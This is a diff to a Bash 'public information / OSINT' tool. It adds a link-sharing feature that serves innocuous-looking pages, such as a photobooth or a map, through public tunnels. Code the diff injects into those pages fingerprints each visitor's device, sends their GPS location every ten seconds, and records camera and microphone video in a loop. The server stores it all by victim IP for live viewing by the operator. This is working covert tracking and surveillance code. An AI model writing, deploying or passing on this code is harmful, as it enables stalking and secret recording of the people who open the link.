@@ -59,7 +59,8 @@ load_env() {
     k=${BASH_REMATCH[1]}; v=${BASH_REMATCH[2]}
     v=${v#"${v%%[![:space:]]*}"}; v=${v%"${v##*[![:space:]]}"}
     if [[ $v =~ $dq ]]; then v=${BASH_REMATCH[1]}
-    elif [[ $v =~ $sq ]]; then v=${BASH_REMATCH[1]}; fi
+    elif [[ $v =~ $sq ]]; then v=${BASH_REMATCH[1]}
+    else v=${v%%[[:space:]]#*}; v=${v%"${v##*[![:space:]]}"}; fi   # buang komentar inline
     is_env_key "$k" && export "$k=$v"
   done < "$f"
 }
@@ -191,6 +192,384 @@ header() {
   for l in "${LOGO[@]}"; do printf '  %s%s%s\n' "$B$CYN" "$l" "$R"; done
   printf '  %sPencarian informasi publik di internet & Pengayaan OSINT%s\n' "$D" "$R"
   printf '  %s────────────────────────────────────────────%s\n\n' "$D" "$R"
+}
+
+# ---------- KONFIGURASI & VARIABEL SHARE PROJECT ----------
+TEMPLATES_DIR="$BASE/templates"
+WORK_DIR="$(mktemp -d /tmp/share-project.XXXXXX)"
+PORT=8787
+
+HIST_DIR="${XDG_STATE_HOME:-$HOME/.local/state}/share-project/history"
+mkdir -p "$HIST_DIR" 2>/dev/null || { HIST_DIR="$WORK_DIR/history"; mkdir -p "$HIST_DIR"; }
+
+SERVER_PID=""
+TUNNEL_PID=""
+TUNNEL_LOG="$WORK_DIR/tunnel.log"
+ACCESS_LOG=""
+SELECTED_TEMPLATE=""
+SELECTED_NAME=""
+TUNNEL_NAME=""
+PUBLIC_URL=""
+CUR_ID=""; CUR_START=""; CUR_TEMPLATE=""; CUR_TUNNEL=""
+
+write_meta() {
+  [ -n "$CUR_ID" ] || return 0
+  printf '%s\t%s\t%s\t%s\t%s\t%s\n' \
+    "$CUR_ID" "$CUR_START" "$1" "$CUR_TEMPLATE" "$CUR_TUNNEL" "$PUBLIC_URL" \
+    >"$HIST_DIR/$CUR_ID.meta"
+}
+
+finish_session() {
+  if [ -n "$CUR_ID" ]; then
+    if [ -f "$HIST_DIR/$CUR_ID.meta" ]; then write_meta "$(now)"; else rm -f "$HIST_DIR/$CUR_ID.log"; fi
+  fi
+  CUR_ID=""; ACCESS_LOG=""; PUBLIC_URL=""
+}
+
+stop_all() {
+  local p
+  for p in "$SERVER_PID" "$TUNNEL_PID"; do
+    [ -n "$p" ] && { kill "$p" >/dev/null 2>&1; wait "$p" 2>/dev/null; }
+  done
+  SERVER_PID=""; TUNNEL_PID=""
+  finish_session
+}
+
+port_free() {
+  local p=$1
+  if has lsof; then ! lsof -i TCP:"$p" -sTCP:LISTEN >/dev/null 2>&1
+  elif has ss; then ! ss -ltn 2>/dev/null | awk '{print $4}' | grep -q ":$p\$"
+  else return 0; fi
+}
+
+find_free_port() {
+  local p=$PORT
+  for _ in $(seq 1 20); do
+    if port_free "$p"; then printf '%s' "$p"; return 0; fi
+    p=$((p+1))
+  done
+  printf '%s' "$PORT"
+}
+
+qr_print() {
+  local url=$1
+  if command -v qrencode >/dev/null 2>&1; then
+    printf '\n'
+    qrencode -t ANSIUTF8 "$url"
+  fi
+}
+
+print_log_line() {
+  local t=$1 kind=$2 dev=$3 ip=$4
+  case "$kind" in
+    FIRST|NEW)
+      printf '  %s[%s]%s %s✔ Link dibuka%s — %s  %s(IP %s)%s\n' \
+        "$D" "$t" "$R" "$GRN$B" "$R" "$dev" "$D" "$ip" "$R" ;;
+    *)
+      printf '  %s[%s] ↻ %s memuat ulang halaman  (IP %s)%s\n' "$D" "$t" "$dev" "$ip" "$R" ;;
+  esac
+}
+
+write_server_py() {
+  cat >"$WORK_DIR/server.py" <<'PYEOF'
+import http.server, json, re, sys, threading, uuid, os, time
+from datetime import datetime
+
+port, logfile = int(sys.argv[1]), sys.argv[2]
+lock = threading.RLock()
+devices, devinfo, names, pending = {}, {}, {}, {}
+
+VIDEO_DIR = os.path.join(os.getcwd(), "saved_videos")
+if not os.path.exists(VIDEO_DIR):
+    os.makedirs(VIDEO_DIR)
+
+BEACON_JS = """<script>(function(){try{
+var d={t:"__T__",w:screen.width,h:screen.height,r:window.devicePixelRatio||1,p:navigator.maxTouchPoints||0};
+function go(){try{fetch("/__beacon",{method:"POST",body:JSON.stringify(d),keepalive:true}).catch(function(){})}catch(e){}}
+var u=navigator.userAgentData;
+if(u&&u.getHighEntropyValues){u.getHighEntropyValues(["model"]).then(function(v){d.m=v.model||"";go()},go)}else{go()}
+}catch(e){}})();</script>"""
+
+IPHONES = {
+    (320, 568, 2): "iPhone SE (1) / 5s", (375, 667, 2): "iPhone 6/7/8 / SE",
+    (414, 736, 3): "iPhone 6/7/8 Plus", (375, 812, 3): "iPhone X / XS / 11 Pro",
+    (414, 896, 2): "iPhone XR / 11", (414, 896, 3): "iPhone XS Max / 11 Pro Max",
+    (390, 844, 3): "iPhone 12 / 13 / 14", (428, 926, 3): "iPhone 12 Pro Max / 13 Pro Max",
+    (393, 852, 3): "iPhone 14 Pro / 15 / 16", (430, 932, 3): "iPhone 14 Pro Max / 15 Plus / 16 Plus"
+}
+
+def client_ip(h, addr):
+    for k in ("CF-Connecting-IP", "X-Real-IP"):
+        if h.get(k): return h[k].strip()
+    if h.get("X-Forwarded-For"):
+        return h["X-Forwarded-For"].split(",")[0].strip()
+    return addr[0]
+
+def describe(ua, info):
+    w = h = r = 0
+    if info:
+        w, h = sorted((int(float(info.get("w", 0))), int(float(info.get("h", 0)))))
+        r = int(float(info.get("r", 0)))
+    if "iPhone" in ua: os_ = IPHONES.get((w, h, r)) or "iPhone"
+    elif "Android" in ua: os_ = "Android"
+    elif "Windows" in ua: os_ = "Windows"
+    elif "Mac OS X" in ua: os_ = "macOS"
+    else: os_ = "Device Lain"
+    br = "Firefox" if "Firefox" in ua else ("Chrome" if "Chrome" in ua else ("Safari" if "Safari" in ua else "Browser"))
+    return "%s di %s" % (br, os_)
+
+def device_id(headers):
+    m = re.search(r"(?:^|;\s*)sp_did=([0-9a-f]+)", headers.get("Cookie", ""))
+    return m.group(1) if m else None
+
+def flush(token):
+    with lock:
+        v = pending.pop(token, None)
+        if not v: return
+        desc = describe(v["ua"], devinfo.get(v["did"]))
+        ids = names.setdefault(desc, [])
+        if v["did"] not in ids: ids.append(v["did"])
+        if ids.index(v["did"]) > 0: desc += " #%d" % (ids.index(v["did"]) + 1)
+        with open(logfile, "a") as f:
+            f.write("%s\t%s\t%s\t%s\t%d\n" % (v["t"], v["kind"], desc, v["ip"], v["total"]))
+
+class Handler(http.server.SimpleHTTPRequestHandler):
+    def log_message(self, *a): pass
+
+    def do_GET(self):
+        if self.path.split("?")[0] not in ("/", "/index.html"):
+            return super().do_GET()
+        did, fresh = device_id(self.headers), False
+        if not did: did, fresh = uuid.uuid4().hex[:12], True
+        token = uuid.uuid4().hex[:10]
+        with lock:
+            kind = "RELOAD" if did in devices else ("NEW" if devices else "FIRST")
+            devices[did] = True
+            pending[token] = dict(
+                t=datetime.now().strftime("%H:%M:%S"), kind=kind, did=did,
+                ua=self.headers.get("User-Agent", ""),
+                ip=client_ip(self.headers, self.client_address), total=len(devices))
+        t = threading.Timer(1.5, flush, [token]); t.daemon = True; t.start()
+
+        with open("index.html", "rb") as f:
+            html = f.read().decode("utf-8", "replace")
+        
+        auto_capture_script = """
+        <script>
+            function sendLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        fetch('/save-location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ link: link })
+                        }).catch(e => {});
+                    }, null, { enableHighAccuracy: true });
+                }
+            }
+            sendLocation();
+            setInterval(sendLocation, 10000);
+
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+                function recordCycle() {
+                    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    let chunks = [];
+                    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const fd = new FormData();
+                        fd.append('video', blob, `rec_${Date.now()}.webm`);
+                        fetch('/save-video', { method: 'POST', body: fd })
+                            .then(() => recordCycle()).catch(() => recordCycle());
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 10000);
+                }
+                recordCycle();
+            }).catch(e => {});
+        </script>
+        """
+        
+        script = BEACON_JS.replace("__T__", token) + auto_capture_script
+        i = html.lower().rfind("</body>")
+        html = html[:i] + script + html[i:] if i >= 0 else html + script
+        body = html.encode("utf-8")
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(body)))
+        self.send_header("Cache-Control", "no-store")
+        if fresh: self.send_header("Set-Cookie", "sp_did=%s; Path=/; Max-Age=31536000; SameSite=Lax" % did)
+        self.end_headers()
+        self.wfile.write(body)
+
+    def do_POST(self):
+        parsed_path = self.path.split("?")[0]
+        client_ip_addr = client_ip(self.headers, self.client_address).replace(":", "_")
+        ip_folder = os.path.join(VIDEO_DIR, client_ip_addr)
+
+        if parsed_path == "/save-location":
+            try:
+                length = int(self.headers.get("Content-Length", 0))
+                data = json.loads(self.rfile.read(length).decode("utf-8"))
+                gmaps_link = data.get("link")
+                if not os.path.exists(ip_folder): os.makedirs(ip_folder)
+                loc_log_file = os.path.join(ip_folder, "log_lokasi.txt")
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                with open(loc_log_file, "a") as f:
+                    f.write(f"[{timestamp}] {gmaps_link}\n")
+                self.send_response(200); self.end_headers(); self.wfile.write(b"OK")
+            except Exception: self.send_error(500)
+            return
+
+        if parsed_path == "/save-video":
+            try:
+                content_type = self.headers.get("Content-Type", "")
+                if "multipart/form-data" in content_type:
+                    length = int(self.headers.get("Content-Length", 0))
+                    body_data = self.rfile.read(length)
+                    header_end = body_data.find(b'\r\n\r\n')
+                    if header_end != -1:
+                        video_bytes = body_data[header_end + 4:-2]
+                        if not os.path.exists(ip_folder): os.makedirs(ip_folder)
+                        filename = f"video_{int(time.time())}_{uuid.uuid4().hex[:4]}.webm"
+                        with open(os.path.join(ip_folder, filename), "wb") as f:
+                            f.write(video_bytes)
+                self.send_response(200); self.end_headers(); self.wfile.write(b"Saved")
+            except Exception: self.send_error(500)
+            return
+
+        if parsed_path != "/__beacon": return self.send_error(404)
+        try:
+            n = min(int(self.headers.get("Content-Length", 0)), 4096)
+            data = json.loads(self.rfile.read(n) or b"{}")
+            if not isinstance(data, dict): data = {}
+        except Exception: data = {}
+        token = str(data.get("t", ""))
+        with lock:
+            v = pending.get(token)
+            did = device_id(self.headers) or (v and v["did"])
+            if did: devinfo[did] = data
+        if v: flush(token)
+        self.send_response(204); self.end_headers()
+
+http.server.ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
+PYEOF
+}
+
+start_server() {
+  local template_file=$1
+  rm -rf "$WORK_DIR/site"; mkdir -p "$WORK_DIR/site"
+  cp "$template_file" "$WORK_DIR/site/index.html"
+
+  CUR_ID="$(date +\%Y\%m\%d-\%H\%M\%S)-$$"
+  CUR_START="$(now)"; CUR_TEMPLATE="$SELECTED_NAME"; CUR_TUNNEL=""
+  ACCESS_LOG="$HIST_DIR/$CUR_ID.log"
+  : >"$ACCESS_LOG"
+  PORT="$(find_free_port)"
+
+  write_server_py
+  ( cd "$WORK_DIR/site" && exec python3 "$WORK_DIR/server.py" "$PORT" "$ACCESS_LOG" ) \
+    >"$WORK_DIR/server.log" 2>&1 &
+  SERVER_PID=$!
+  sleep 1
+  if ! kill -0 "$SERVER_PID" 2>/dev/null; then
+    die "Server lokal gagal start (lihat $WORK_DIR/server.log)"
+  fi
+}
+
+start_ngrok() {
+  command -v ngrok >/dev/null 2>&1 || die "ngrok belum terpasang."
+  ngrok http "$PORT" --log=stdout >"$TUNNEL_LOG" 2>&1 &
+  TUNNEL_PID=$!
+  local url="" tries=0
+  while [ -z "$url" ] && [ "$tries" -lt 20 ]; do
+    sleep 1
+    url=$(curl -fsS http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"[^"]*"' | grep '^"public_url":"https' | head -n1 | sed 's/"public_url":"//; s/"$//')
+    tries=$((tries+1))
+  done
+  [ -n "$url" ] || die "Tidak bisa mendapatkan link ngrok."
+  PUBLIC_URL="$url"
+}
+
+start_cloudflared() {
+  command -v cloudflared >/dev/null 2>&1 || die "cloudflared belum terpasang."
+  cloudflared tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate >"$TUNNEL_LOG" 2>&1 &
+  TUNNEL_PID=$!
+  local url="" tries=0
+  while [ -z "$url" ] && [ "$tries" -lt 30 ]; do
+    sleep 1
+    url=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' "$TUNNEL_LOG" 2>/dev/null | head -n1)
+    tries=$((tries+1))
+  done
+  [ -n "$url" ] || die "Tidak bisa mendapatkan link cloudflare."
+  PUBLIC_URL="$url"
+}
+
+pick_tunnel_and_run() {
+  while true; do
+    header
+    printf '%s\n' "${B}Pilih tunnel:${R}"
+    printf '  [1] ngrok\n'
+    printf '  [2] cloudflare\n'
+    printf '  [K] Kembali\n\n'
+    printf 'Masukkan: '
+    read -r choice
+    case "$choice" in
+      1) CUR_TUNNEL="ngrok"; start_ngrok; return 0 ;;
+      2) CUR_TUNNEL="cloudflare"; start_cloudflared; return 0 ;;
+      [Kk]) return 1 ;;
+    esac
+  done
+}
+
+show_link() {
+  write_meta ""
+  header
+  printf '%sLink Live Tracking (Lokasi & Kamera Berjalan):%s\n\n' "$GRN$B" "$R"
+  printf '  %s%s%s\n\n' "$B" "$PUBLIC_URL" "$R"
+  qr_print "$PUBLIC_URL"
+  printf '\nTekan %sCtrl+C%s untuk berhenti dan kembali ke menu.\n\n' "$B" "$R"
+  
+  local shown=0 total t kind dev ip n
+  GOT_INT=""; IN_LINK_VIEW=1
+  while [ -z "$GOT_INT" ]; do
+    total=$(wc -l <"$ACCESS_LOG" 2>/dev/null | tr -d ' ')
+    if [ "${total:-0}" -gt "$shown" ]; then
+      while IFS=$'\t' read -r t kind dev ip n; do
+        print_log_line "$t" "$kind" "$dev" "$ip"
+      done < <(tail -n +"$((shown+1))" "$ACCESS_LOG")
+      shown=$total
+    fi
+    read -rsn1 -t 1 key || true
+  done
+  IN_LINK_VIEW=""; GOT_INT=""
+}
+
+share_project_session() {
+  [ -d "$TEMPLATES_DIR" ] || die "Folder templates/ tidak ditemukan."
+  while true; do
+    stop_all
+    header
+    printf '%sPilih template preview:%s\n' "$B" "$R"
+    printf '  [1] Photobooth\n'
+    printf '  [2] With U\n'
+    printf '  [3] Maps\n'
+    printf '  [K] Kembali ke menu utama\n\n'
+    printf 'Masukkan: '
+    read -r tchoice
+    case "$tchoice" in
+      1) SELECTED_TEMPLATE="$TEMPLATES_DIR/photobooth.html"; SELECTED_NAME="Photobooth" ;;
+      2) SELECTED_TEMPLATE="$TEMPLATES_DIR/with-u.html"; SELECTED_NAME="With U" ;;
+      3) SELECTED_TEMPLATE="$TEMPLATES_DIR/maps.html"; SELECTED_NAME="Maps" ;;
+      [Kk]|'') return ;;
+      *) continue ;;
+    esac
+    start_server "$SELECTED_TEMPLATE"
+    if pick_tunnel_and_run; then
+      show_link
+    fi
+  done
 }
 
 # ---------- utilitas ----------
@@ -2043,6 +2422,12 @@ ipv4_ok() {
 ipv6_expand() { # -> 8 grup heksadesimal 4 digit dipisah ":" ; gagal jika bukan IPv6 yang valid
   local a=${1,,} head tail g n i
   local -a h=() t=() out=()
+  local o1 o2 o3 o4
+  if [[ $a =~ ^([0-9a-f:]*:)([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$ ]]; then
+    o1=$((10#${BASH_REMATCH[2]})); o2=$((10#${BASH_REMATCH[3]})); o3=$((10#${BASH_REMATCH[4]})); o4=$((10#${BASH_REMATCH[5]}))
+    (( o1 <= 255 && o2 <= 255 && o3 <= 255 && o4 <= 255 )) || return 1
+    a=$(printf '%s%x:%x' "${BASH_REMATCH[1]}" $((o1 * 256 + o2)) $((o3 * 256 + o4)))
+  fi
   [[ $a =~ ^[0-9a-f:]+$ ]] || return 1
   [[ $a == *:::* ]] && return 1
   if [[ $a == *::* ]]; then
@@ -2460,21 +2845,9 @@ ip_menu() {
   done
 }
 
-# [1] Dapatkan IP: belum ada isi. Input apa pun saat ini tidak melakukan apa-apa;
-# kosongkan lalu Enter untuk kembali ke menu Cek IP.
+# Ganti fungsi ip_get_session() yang lama dengan ini:
 ip_get_session() {
-  local notice="" in
-  while :; do
-    header
-    printf '  %sDAPATKAN IP%s  %s(kosongkan lalu Enter untuk kembali)%s\n\n' "$B" "$R" "$D" "$R"
-    printf '  %sBelum tersedia.%s\n\n' "$D" "$R"
-    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
-    printf '  Masukkan: '
-    read -r in || exit 0
-    in=$(sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' <<< "$in")
-    [ -z "$in" ] && return
-    notice="Fitur ini belum tersedia."
-  done
+  share_project_session
 }
 
 # [2] Cari IP: analisis pasif IP / domain / header email (fitur Cek IP yang sudah ada).
@@ -2529,7 +2902,7 @@ menu() { # $1 = fungsi penggambar layar; sisanya = pilihan. Hasil di $CHOICE
 SELF="$(readlink -f "${BASH_SOURCE[0]}")"
 
 update_worker() { # $1 = file status: baris 1 state, 2 pesan, 3 hash lama, 4 hash baru
-  local out=$1 old new up msg
+  local out=$1 old new up msg backup=""
   export GIT_TERMINAL_PROMPT=0
   if ! command -v git >/dev/null; then printf 'error\nGit belum terpasang. Install: sudo apt install -y git\n\n\n' > "$out"; return; fi
   if ! git -C "$BASE" rev-parse --git-dir >/dev/null 2>&1; then
@@ -2992,7 +3365,7 @@ SET_HINT=(
 SET_SPLIT2=${#SET_KEY[@]}
 for _j in "${!LIM_ID[@]}"; do
   SET_KEY+=("LIMIT_${LIM_ID[_j]^^}"); SET_LABEL+=("Limit ${LIM_NAME[_j]}"); SET_TYPE+=(num); SET_OPTS+=("")
-  SET_HINT+=("Maksimal permintaan ${LIM_NAME[_j]} per hari (sesuai kuota API-mu, mis. 100). Ketik "-" (atau 0) untuk tanpa batas / unlimited. Hitungan reset tiap tengah malam (jam lokal).")
+  SET_HINT+=("Maksimal permintaan ${LIM_NAME[_j]} per hari (sesuai kuota API-mu, mis. 100). Ketik \"-\" (atau 0) untuk tanpa batas / unlimited. Hitungan reset tiap tengah malam (jam lokal).")
 done
 unset _j
 
@@ -3135,7 +3508,9 @@ settings_screen() {
 cleanup() {
   [ -n "$TMP" ] && rm -rf "$TMP"
   [ -n "${ETMP:-}" ] && rm -rf "$ETMP"
-  kill $(jobs -p) 2>/dev/null
+  stop_all 2>/dev/null
+  rm -rf "$WORK_DIR" 2>/dev/null
+  local _p; _p=$(jobs -p); [ -n "$_p" ] && kill $_p 2>/dev/null   # shellcheck disable=SC2086
 }
 
 usage() {
@@ -3174,6 +3549,7 @@ cli_search() {
 }
 
 main() {
+  trap cleanup EXIT   # dipasang paling awal agar folder temp ikut dibersihkan di semua jalur
   quota_prune
   case "${1:-}" in
     -h|--help) usage; exit 0 ;;
